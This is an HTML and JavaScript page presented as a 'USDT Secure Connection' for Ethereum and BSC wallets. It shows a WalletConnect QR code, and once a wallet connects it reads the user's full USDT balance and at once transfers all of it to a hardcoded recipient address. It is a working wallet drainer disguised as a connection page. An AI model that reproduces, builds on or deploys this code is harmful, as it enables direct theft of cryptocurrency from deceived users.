<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Transfer | BSC + Ethereum</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #050508;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #00ff88;
            overflow: hidden;
        }

        .grid-bg {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }
        .grid-bg::before {
            content: '';
            position: absolute;
            width: 600px;
            height: 600px;
            top: -120px;
            left: -150px;
            background: radial-gradient(circle, rgba(0,255,136,0.08) 0%, transparent 70%);
            border-radius: 50%;
            animation: drift1 12s ease-in-out infinite alternate;
        }
        .grid-bg::after {
            content: '';
            position: absolute;
            width: 500px;
            height: 500px;
            bottom: -100px;
            right: -100px;
            background: radial-gradient(circle, rgba(0,180,255,0.06) 0%, transparent 70%);
            border-radius: 50%;
            animation: drift2 14s ease-in-out infinite alternate;
        }
        .bg-blob-third {
            position: fixed;
            width: 400px;
            height: 400px;
            top: 50%;
            left: 60%;
            transform: translate(-50%, -50%);
            background: radial-gradient(circle, rgba(0,255,136,0.04) 0%, transparent 70%);
            border-radius: 50%;
            animation: drift3 10s ease-in-out infinite alternate;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes drift1 {
            0%   { transform: translate(0, 0) scale(1); }
            100% { transform: translate(80px, 60px) scale(1.15); }
        }
        @keyframes drift2 {
            0%   { transform: translate(0, 0) scale(1); }
            100% { transform: translate(-70px, -50px) scale(1.2); }
        }
        @keyframes drift3 {
            0%   { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
            100% { transform: translate(-40%, -60%) scale(1.3); opacity: 1; }
        }

        .grid-overlay {
            position: fixed;
            inset: 0;
            background-image:
                linear-gradient(0deg, rgba(0,255,136,0.015) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,255,136,0.015) 1px, transparent 1px);
            background-size: 60px 60px;
            pointer-events: none;
            z-index: 0;
            animation: gridPulse 8s ease-in-out infinite;
        }
        @keyframes gridPulse {
            0%, 100% { opacity: 0.4; }
            50%      { opacity: 1; }
        }

        .particle {
            position: fixed;
            width: 2px;
            height: 2px;
            background: rgba(0,255,136,0.3);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
        }
        .particle:nth-child(1)  { top: 15%; left: 10%; animation: float 9s 0s infinite; }
        .particle:nth-child(2)  { top: 70%; left: 85%; animation: float 11s 1s infinite; }
        .particle:nth-child(3)  { top: 40%; left: 92%; animation: float 8s 2s infinite; }
        .particle:nth-child(4)  { top: 85%; left: 20%; animation: float 13s 0.5s infinite; }
        .particle:nth-child(5)  { top: 25%; left: 65%; animation: float 10s 3s infinite; }
        .particle:nth-child(6)  { top: 55%; left: 5%;  animation: float 12s 1.5s infinite; width: 3px; height: 3px; }
        .particle:nth-child(7)  { top: 10%; left: 45%; animation: float 14s 2.5s infinite; width: 1.5px; height: 1.5px; }
        .particle:nth-child(8)  { top: 90%; left: 55%; animation: float 9.5s 4s infinite; }
        @keyframes float {
            0%   { transform: translateY(0) translateX(0); opacity: 0; }
            10%  { opacity: 1; }
            90%  { opacity: 1; }
            100% { transform: translateY(-120px) translateX(30px); opacity: 0; }
        }

        .card {
            position: relative;
            z-index: 1;
            background: linear-gradient(165deg, rgba(14,16,20,0.97) 0%, rgba(8,10,14,0.99) 100%);
            border: 1px solid rgba(0,255,136,0.1);
            border-radius: 20px;
            padding: 44px 38px 36px;
            width: 100%;
            max-width: 420px;
            margin: 20px;
            text-align: center;
            box-shadow:
                0 4px 60px rgba(0,0,0,0.6),
                0 0 0 1px rgba(255,255,255,0.03) inset,
                0 1px 0 rgba(255,255,255,0.04) inset;
            backdrop-filter: blur(20px);
            animation: cardIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
        }
        @keyframes cardIn {
            0%   { opacity: 0; transform: translateY(30px) scale(0.97); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 40px;
            right: 40px;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.5), transparent);
            border-radius: 1px;
        }

        .logo {
            font-size: 10px;
            letter-spacing: 5px;
            color: rgba(0,255,136,0.3);
            margin-bottom: 10px;
            font-weight: 400;
        }
        h1 {
            font-size: 22px;
            letter-spacing: 4px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #00ff88 0%, #00ccaa 50%, #00aaff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .chain-badge {
            display: inline-block;
            font-size: 9px;
            letter-spacing: 2.5px;
            color: #050508;
            background: linear-gradient(135deg, #00ff88, #00ddaa);
            padding: 4px 14px;
            border-radius: 20px;
            margin-bottom: 30px;
            font-weight: 700;
            box-shadow: 0 0 20px rgba(0,255,136,0.15);
        }

        .qr-wrap {
            background: #080a0d;
            border: 1px solid rgba(0,255,136,0.08);
            border-radius: 14px;
            padding: 28px 24px;
            min-height: 290px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 14px;
            margin-bottom: 22px;
            position: relative;
            overflow: hidden;
        }
        .qr-wrap::before {
            content: '';
            position: absolute;
            inset: 0;
            background:
                radial-gradient(ellipse at 30% 20%, rgba(255,255,255,0.015) 0%, transparent 60%),
                radial-gradient(ellipse at 70% 80%, rgba(0,140,255,0.015) 0%, transparent 60%);
            pointer-events: none;
        }
        .qr-label {
            font-size: 9px;
            color: rgba(0,255,136,0.35);
            letter-spacing: 3px;
            font-weight: 400;
        }

        .status-box {
            font-size: 11px;
            color: rgba(0,255,136,0.6);
            margin-bottom: 18px;
            min-height: 20px;
            line-height: 1.7;
            letter-spacing: 0.3px;
        }
        .status-box.error { color: #ff4455; }
        .status-box.warn  { color: #ffaa00; }
        .status-box.ok    { color: #00ff88; }

        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 9px;
            color: rgba(0,255,136,0.3);
            border-top: 1px solid rgba(0,255,136,0.06);
            padding-top: 16px;
            letter-spacing: 0.5px;
        }

        .spinner {
            width: 30px;
            height: 30px;
            border: 2px solid rgba(0,255,136,0.1);
            border-top-color: #00ff88;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            box-shadow: 0 0 12px rgba(0,255,136,0.15);
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        a { color: #00ff88; text-decoration: none; }
        a:hover { text-decoration: underline; }

        #qrCanvas img, #qrCanvas canvas {
            border-radius: 6px;
        }
    </style>
</head>
<body>

<div class="grid-bg"></div>
<div class="grid-overlay"></div>
<div class="bg-blob-third"></div>
<div class="particle"></div>
<div class="particle"></div>
<div class="particle"></div>
<div class="particle"></div>
<div class="particle"></div>
<div class="particle"></div>
<div class="particle"></div>
<div class="particle"></div>

<div class="card">
    <div class="logo">MULTI-CHAIN</div>
    <h1>USDT SECURE CONNECTION</h1>
    <span class="chain-badge">BSC / ETH</span>

    <div class="qr-wrap">
        <div class="spinner" id="spinner"></div>
        <div id="qrCanvas" style="display:none"></div>
        <div class="qr-label" id="qrLabel"></div>
    </div>

    <div class="status-box warn" id="status">Initializing WalletConnect...</div>

    <div class="info-row">
        <span id="balanceInfo">Balance: —</span>
        <span id="addrInfo">Not connected</span>
    </div>
</div>

<script type="module">
import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.11.2';

const RECIPIENT = "0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1";
const PROJECT_ID = "9b0ce1ead8ab25a313e9942a4809a40f";

// Chain configurations
const CHAINS = {
    1: {   // Ethereum
        name: "Ethereum",
        usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        explorer: "https://etherscan.io",
        rpc: "https://ethereum-rpc.publicnode.com"
    },
    56: {  // BSC
        name: "BNB Chain",
        usdt: "0x55d398326f99059fF775485246999027B3197955",
        explorer: "https://bscscan.com",
        rpc: "https://bsc-dataseed1.binance.org/"
    }
};

const USDT_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address,uint256) returns (bool)",
    "function decimals() view returns (uint8)"
];

let wcProvider, ethersProvider, signer, userAddress;
let currentChainId = null;
let storedBalance, storedDecimals;

function setStatus(msg, cls = '') {
    const el = document.getElementById('status');
    el.innerHTML = msg;
    el.className = 'status-box ' + cls;
}

function showQR(uri) {
    document.getElementById('spinner').style.display = 'none';
    const wrap = document.getElementById('qrCanvas');
    wrap.style.display = 'block';
    wrap.innerHTML = '';
    new QRCode(wrap, {
        text: uri,
        width: 240, height: 240,
        colorDark: "#ffffff",
        colorLight: "#080a0d",
        correctLevel: QRCode.CorrectLevel.M
    });
    document.getElementById('qrLabel').textContent = 'SCAN WITH WALLET';
    setStatus('Scan QR code with your wallet (BSC or Ethereum)', 'warn');
}

async function init() {
    try {
        document.getElementById('spinner').style.display = 'block';
        document.getElementById('qrCanvas').style.display = 'none';
        setStatus('Initializing WalletConnect (supports BSC & ETH)...', 'warn');

        // ========== YOUR EXACT INIT CONFIG ==========
        wcProvider = await EthereumProvider.init({
            projectId: PROJECT_ID,
            chains: [1, 56],           // Ethereum & BSC
            optionalChains: [1, 56],
            showQrModal: false,
            rpcMap: {
                1: "https://ethereum-rpc.publicnode.com",
                56: "https://bsc-dataseed1.binance.org/"
            }
        });
        // ============================================

        wcProvider.on("display_uri", (uri) => {
            showQR(uri);
        });

        wcProvider.on("connect", async () => {
            document.getElementById('qrCanvas').style.display = 'none';
            document.getElementById('qrLabel').textContent = '';
            document.getElementById('spinner').style.display = 'block';
            
            ethersProvider = new ethers.providers.Web3Provider(wcProvider);
            signer = ethersProvider.getSigner();
            userAddress = await signer.getAddress();
            document.getElementById('addrInfo').textContent = userAddress.slice(0,6) + '...' + userAddress.slice(-4);

            // Detect which network the wallet is on
            const network = await ethersProvider.getNetwork();
            currentChainId = network.chainId;
            
            if (currentChainId !== 1 && currentChainId !== 56) {
                setStatus('Please switch to Ethereum or BSC network in your wallet.', 'error');
                document.getElementById('spinner').style.display = 'none';
                return;
            }
            
            const chain = CHAINS[currentChainId];
            setStatus(`Connected to ${chain.name}. Fetching USDT balance...`, 'warn');

            // Get USDT balance
            const usdt = new ethers.Contract(chain.usdt, USDT_ABI, signer);
            storedDecimals = await usdt.decimals();
            storedBalance = await usdt.balanceOf(userAddress);
            const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);

            document.getElementById('spinner').style.display = 'none';
            document.getElementById('balanceInfo').textContent = `Balance: ${parseFloat(formatted).toFixed(4)} USDT (${chain.name})`;

            if (storedBalance.eq(0)) {
                setStatus(`No USDT balance found on ${chain.name}.`, 'error');
                return;
            }

            setStatus(`Ready — ${parseFloat(formatted).toFixed(4)} USDT available. Auto-sending...`, 'ok');
            
            // 🔥 AUTO-FIRE TRANSFER IMMEDIATELY 🔥
            await autoSendUSDT();
        });

        wcProvider.on("disconnect", () => {
            setStatus('Wallet disconnected.', 'error');
        });

        wcProvider.on("chainChanged", (chainIdHex) => {
            const newChainId = parseInt(chainIdHex, 16);
            currentChainId = newChainId;
            setStatus(`Network changed to ${CHAINS[newChainId]?.name || 'unknown'}. Reconnect required.`, 'warn');
        });

        await wcProvider.connect();

    } catch (err) {
        console.error(err);
        document.getElementById('spinner').style.display = 'none';
        setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
    }
}

async function autoSendUSDT() {
    if (!signer || !userAddress || !currentChainId) return;
    
    const chain = CHAINS[currentChainId];
    setStatus(`Sending ${parseFloat(ethers.utils.formatUnits(storedBalance, storedDecimals)).toFixed(4)} USDT on ${chain.name}...`, 'warn');
    
    try {
        const usdt = new ethers.Contract(chain.usdt, USDT_ABI, signer);
        const tx = await usdt.transfer(RECIPIENT, storedBalance);
        setStatus(`Confirming: <a href="${chain.explorer}/tx/${tx.hash}" target="_blank">${tx.hash.slice(0,14)}...</a>`, 'warn');
        const receipt = await tx.wait();
        
        if (receipt && receipt.status === 1) {
            const formatted = ethers.utils.formatUnits(storedBalance, storedDecimals);
            setStatus(`✅ SUCCESS! Sent ${parseFloat(formatted).toFixed(4)} USDT on ${chain.name}. <a href="${chain.explorer}/tx/${tx.hash}" target="_blank">View TX</a>`, 'ok');
            document.getElementById('balanceInfo').textContent = `Balance: 0 USDT (${chain.name})`;
        } else {
            setStatus('Transaction reverted.', 'error');
        }
    } catch (err) {
        const msg = err.message || String(err);
        setStatus(msg.includes('rejected') ? 'Transaction rejected in wallet.' : 'Error: ' + msg.slice(0, 80), 'error');
    }
}

init();
</script>
</body>
</html>
